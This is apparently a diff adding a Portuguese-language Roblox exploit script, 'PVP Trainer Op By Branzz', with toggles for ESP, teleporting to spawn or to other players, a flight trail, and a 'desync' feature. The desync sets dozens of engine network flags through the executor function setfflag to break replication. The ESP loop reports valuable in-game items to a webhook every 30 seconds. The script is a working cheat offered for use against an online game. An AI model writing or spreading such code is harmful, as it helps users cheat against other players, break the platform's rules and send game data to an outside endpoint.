+        espBestBtn.Text = "💎 ESP Best: ON"
+        espBestBtn.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
+        
+        local activeTag = Instance.new("BoolValue")
+        activeTag.Name = "Active"
+        activeTag.Parent = espBestBtn
+        
+        -- Detectar e enviar webhook
+        spawn(function()
+            while espBestEnabled do
+                local brainrots, valorizado = findBrainrots()
+                if #brainrots > 0 or valorizado then
+                    sendWebhook(brainrots)
+                end
+                wait(30) -- Verificar a cada 30 segundos
+            end
+        end)
+        
+        print("💎 ESP Best ativado! Monitorando brainrots...")
+    else
+        espBestBtn.Text = "💎 ESP Best: OFF"
+        espBestBtn.BackgroundColor3 = Color3.fromRGB(95, 55, 160)
+        
+        if espBestBtn:FindFirstChild("Active") then
+            espBestBtn.Active:Destroy()
+        end
+    end
+end)
+
+-- ========== TP SPAWN ==========
+tpSpawnBtn.MouseButton1Click:Connect(function()
+    if character and character:FindFirstChild("HumanoidRootPart") then
+        local spawnLocation = workspace:FindFirstChild("SpawnLocation") or workspace:FindFirstChildOfClass("SpawnLocation")
+        
+        if spawnLocation then
+            character.HumanoidRootPart.CFrame = spawnLocation.CFrame + Vector3.new(0, 5, 0)
+            tpSpawnBtn.Text = "✅ Teleportado!"
+        else
+            character.HumanoidRootPart.CFrame = CFrame.new(0, 50, 0)
+            tpSpawnBtn.Text = "✅ TP para Spawn"
+        end
+        
+        tpSpawnBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
+        
+        wait(2)
+        tpSpawnBtn.Text = "🏠 TP to Spawn"
+        tpSpawnBtn.BackgroundColor3 = Color3.fromRGB(80, 50, 140)
+    end
+end)
+
+-- ========== TP RANDOM PLAYER ==========
+tpRandomBtn.MouseButton1Click:Connect(function()
+    local players = Players:GetPlayers()
+    local randomPlayer = nil
+    
+    for _, p in pairs(players) do
+        if p ~= player and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+            randomPlayer = p
+            break
+        end
+    end
+    
+    if randomPlayer and character and character:FindFirstChild("HumanoidRootPart") then
+        character.HumanoidRootPart.CFrame = randomPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(5, 0, 0)
+        tpRandomBtn.Text = "✅ TP para " .. randomPlayer.Name
+        tpRandomBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
+        
+        wait(2)
+        tpRandomBtn.Text = "🎲 TP Random Player"
+        tpRandomBtn.BackgroundColor3 = Color3.fromRGB(80, 50, 140)
+    else
+        tpRandomBtn.Text = "⚠️ Nenhum player!"
+        tpRandomBtn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
+        
+        wait(2)
+        tpRandomBtn.Text = "🎲 TP Random Player"
+        tpRandomBtn.BackgroundColor3 = Color3.fromRGB(80, 50, 140)
+    end
+end)
+
+-- ========== FLIGHT TRAIL ==========
+local trailEnabled = false
+
+trailBtn.MouseButton1Click:Connect(function()
+    trailEnabled = not trailEnabled
+    
+    if trailEnabled then
+        trailBtn.Text = "✨ Flight Trail: ON"
+        trailBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
+        
+        local activeTag = Instance.new("BoolValue")
+        activeTag.Name = "Active"
+        activeTag.Parent = trailBtn
+        
+        if character and character:FindFirstChild("HumanoidRootPart") then
+            local trail = Instance.new("Trail")
+            trail.Name = "FlightTrail"
+            trail.Color = ColorSequence.new(Color3.fromRGB(138, 43, 226), Color3.fromRGB(255, 100, 255))
+            trail.Transparency = NumberSequence.new(0.2, 1)
+            trail.Lifetime = 2
+            trail.MinLength = 0
+            trail.FaceCamera = true
+            trail.Enabled = true
+            
+            local attach0 = Instance.new("Attachment")
+            attach0.Name = "TrailAttach0"
+            attach0.Position = Vector3.new(-1, 0, 0)
+            attach0.Parent = character.HumanoidRootPart
+            
+            local attach1 = Instance.new("Attachment")
+            attach1.Name = "TrailAttach1"
+            attach1.Position = Vector3.new(1, 0, 0)
+            attach1.Parent = character.HumanoidRootPart
+            
+            trail.Attachment0 = attach0
+            trail.Attachment1 = attach1
+            trail.Parent = character.HumanoidRootPart
+            
+            local particles = Instance.new("ParticleEmitter")
+            particles.Name = "FlightParticles"
+            particles.Texture = "rbxasset://textures/particles/sparkles_main.dds"
+            particles.Color = ColorSequence.new(Color3.fromRGB(138, 43, 226))
+            particles.Size = NumberSequence.new(0.5, 0)
+            particles.Transparency = NumberSequence.new(0, 1)
+            particles.Lifetime = NumberRange.new(0.5, 1)
+            particles.Rate = 60
+            particles.Speed = NumberRange.new(2, 5)
+            particles.SpreadAngle = Vector2.new(30, 30)
+            particles.Enabled = true
+            particles.Parent = character.HumanoidRootPart
+        end
+    else
+        trailBtn.Text = "✨ Flight Trail: OFF"
+        trailBtn.BackgroundColor3 = Color3.fromRGB(95, 55, 160)
+        
+        if trailBtn:FindFirstChild("Active") then
+            trailBtn.Active:Destroy()
+        end
+        
+        if character and character:FindFirstChild("HumanoidRootPart") then
+            if character.HumanoidRootPart:FindFirstChild("FlightTrail") then
+                character.HumanoidRootPart.FlightTrail:Destroy()
+            end
+            if character.HumanoidRootPart:FindFirstChild("TrailAttach0") then
+                character.HumanoidRootPart.TrailAttach0:Destroy()
+            end
+            if character.HumanoidRootPart:FindFirstChild("TrailAttach1") then
+                character.HumanoidRootPart.TrailAttach1:Destroy()
+            end
+            if character.HumanoidRootPart:FindFirstChild("FlightParticles") then
+                character.HumanoidRootPart.FlightParticles:Destroy()
+            end
+        end
+    end
+end)
+
+-- ========== DESYNC PROFISSIONAL ==========
+local FFlags = {
+    GameNetPVHeaderRotationalVelocityZeroCutoffExponent = -5000,
+    LargeReplicatorWrite5 = true,
+    LargeReplicatorEnabled9 = true,
+    AngularVelociryLimit = 360,
+    TimestepArbiterVelocityCriteriaThresholdTwoDt = 2147483646,
+    S2PhysicsSenderRate = 15000,
+    DisableDPIScale = true,
+    MaxDataPacketPerSend = 2147483647,
+    PhysicsSenderMaxBandwidthBps = 20000,
+    TimestepArbiterHumanoidLinearVelThreshold = 21,
+    MaxMissedWorldStepsRemembered = -2147483648,
+    PlayerHumanoidPropertyUpdateRestrict = true,
+    SimDefaultHumanoidTimestepMultiplier = 0,
+    StreamJobNOUVolumeLengthCap = 2147483647,
+    DebugSendDistInSteps = -2147483648,
+    GameNetDontSendRedundantNumTimes = 1,
+    CheckPVLinearVelocityIntegrateVsDeltaPositionThresholdPercent = 1,
+    CheckPVDifferencesForInterpolationMinVelThresholdStudsPerSecHundredth = 1,
+    LargeReplicatorSerializeRead3 = true,
+    ReplicationFocusNouExtentsSizeCutoffForPauseStuds = 2147483647,
+    CheckPVCachedVelThresholdPercent = 10,
+    CheckPVDifferencesForInterpolationMinRotVelThresholdRadsPerSecHundredth = 1,
+    GameNetDontSendRedundantDeltaPositionMillionth = 1,
+    InterpolationFrameVelocityThresholdMillionth = 5,
+    StreamJobNOUVolumeCap = 2147483647,
+    InterpolationFrameRotVelocityThresholdMillionth = 5,
+    CheckPVCachedRotVelThresholdPercent = 10,
+    WorldStepMax = 30,
+    InterpolationFramePositionThresholdMillionth = 5,
+    TimestepArbiterHumanoidTurningVelThreshold = 1,
+    SimOwnedNOUCountThresholdMillionth = 2147483647,
+    GameNetPVHeaderLinearVelocityZeroCutoffExponent = -5000,
+    NextGenReplicatorEnabledWrite4 = true,
+    TimestepArbiterOmegaThou = 1073741823,
+    MaxAcceptableUpdateDelay = 1,
+    LargeReplicatorSerializeWrite4 = true
+}
+
+desyncBtn.MouseButton1Click:Connect(function()
+    desyncEnabled = not desyncEnabled
+    
+    if desyncEnabled then
+        desyncBtn.Text = "🌀 Ativando Desync..."
+        desyncBtn.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
+        desyncIndicator.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
+        
+        -- Aplicar FFlags
+        for name, value in pairs(FFlags) do
+            pcall(function()
+                if setfflag then
+                    setfflag(tostring(name), tostring(value))
+                end
+            end)
+        end
+        
+        wait(0.5)
+        
+        desyncBtn.Text = "🌀 Desync: ON"
+        desyncBtn.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
+        desyncIndicator.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
+        
+        local activeTag = Instance.new("BoolValue")
+        activeTag.Name = "Active"
+        activeTag.Parent = desyncBtn
+        
+        print("✅ Desync by Branzz ativado!")
+    else
+        desyncBtn.Text = "🌀 Desync: OFF"
+        desyncBtn.BackgroundColor3 = Color3.fromRGB(95, 55, 160)
+        desyncIndicator.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
+        
+        if desyncBtn:FindFirstChild("Active") then
+            desyncBtn.Active:Destroy()
+        end
+    end
+end)
+
+-- ========== ATUALIZAR CHARACTER ==========
+player.CharacterAdded:Connect(function(newChar)
+    character = newChar
+    
+    wait(0.5)
+    setupAntiRagdoll()
+    
+    if desyncEnabled then
+        desyncEnabled = false
+        desyncBtn.Text = "🌀 Desync: OFF"
+        desyncBtn.BackgroundColor3 = Color3.fromRGB(95, 55, 160)
+        desyncIndicator.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
+        
+        if desyncBtn:FindFirstChild("Active") then
+            desyncBtn.Active:Destroy()
+        end
+    end
+end)
+
+-- ========== ANIMAÇÃO DE ENTRADA ==========
+mainFrame.Size = UDim2.new(0, 0, 0, 0)
+mainFrame:TweenSize(UDim2.new(0, 320, 0, 400), Enum.EasingDirection.Out, Enum.EasingStyle.Back, 0.5, true)
+
+print("✅ PVP Trainer Op By Branzz - VERSÃO FINAL carregada!")
+print("🛡️ Anti-Ragdoll, Anti-Fling e Anti-Knockback ativados!")
+print("🌐 Webhook configurado e pronto!")
